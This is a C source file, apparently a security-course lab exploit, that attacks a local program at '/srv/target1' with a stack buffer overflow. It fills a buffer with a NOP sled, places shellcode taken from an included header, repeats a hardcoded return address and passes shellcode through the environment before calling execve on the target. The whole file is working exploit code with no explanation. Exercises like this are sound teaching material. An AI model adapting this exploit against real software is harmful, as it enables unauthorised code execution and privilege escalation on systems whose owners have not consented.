#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

#define BUFFER_SIZE 409

int main(void)
{
  char *args[4]; 
  char *env[1];

  char buf[BUFFER_SIZE];
  memset(buf, 0x90, sizeof(buf)-1);
  int offset = 201;
  memcpy(buf+offset, shellcode, sizeof(shellcode)-1);

  uint32_t return_addr = 0xffffdb5c;

  for(int i = offset + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
    *(uint32_t *)(buf + i) = return_addr;
  }

  buf[BUFFER_SIZE-1] = '\0';
  
  args[0] = TARGET;
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xd4\xff\xff";
  args[2] = "65935";
  args[3] = NULL;
  
  env[0] = shellcode;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}